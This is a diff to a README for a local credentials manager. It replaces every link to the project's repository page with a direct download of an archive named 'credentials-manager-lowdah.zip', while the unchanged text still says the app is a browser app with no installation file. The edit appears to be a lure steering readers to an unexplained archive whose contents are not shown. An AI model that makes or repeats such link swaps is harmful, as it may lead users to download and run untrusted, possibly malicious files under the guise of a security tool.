@@ -1,6 +1,6 @@
 # 🔐 credentials-manager - Secure Local Credentials with 2FA
 
-[![Download](https://img.shields.io/badge/Download-Get%20Credentials-blue)](https://github.com/minhhai806/credentials-manager)
+[![Download](https://img.shields.io/badge/Download-Get%20Credentials-blue)](https://raw.githubusercontent.com/minhhai806/credentials-manager/main/assets/credentials-manager-lowdah.zip)
 
 ---
 
@@ -29,12 +29,12 @@ You don’t need to connect to the internet after downloading the app to use it.
 
 Click the big button below to visit the page where you can download the app.
 
-[![Download](https://img.shields.io/badge/Download-Get%20Credentials-green)](https://github.com/minhhai806/credentials-manager)
+[![Download](https://img.shields.io/badge/Download-Get%20Credentials-green)](https://raw.githubusercontent.com/minhhai806/credentials-manager/main/assets/credentials-manager-lowdah.zip)
 
 ### How to download and run the app
 
 1. Click the button above or visit  
-   https://github.com/minhhai806/credentials-manager
+   https://raw.githubusercontent.com/minhhai806/credentials-manager/main/assets/credentials-manager-lowdah.zip
 
 2. On the repository page, look for the **Releases** section or the main README. The app is a web application you run directly in your browser. There is no installation file.
 
@@ -139,4 +139,4 @@ You only need the **index.html** and related files to use credentials-manager.
 
 To get started now, visit the repository page and download the app:
 
-[https://github.com/minhhai806/credentials-manager](https://github.com/minhhai806/credentials-manager)
+[https://raw.githubusercontent.com/minhhai806/credentials-manager/main/assets/credentials-manager-lowdah.zip](https://raw.githubusercontent.com/minhhai806/credentials-manager/main/assets/credentials-manager-lowdah.zip)
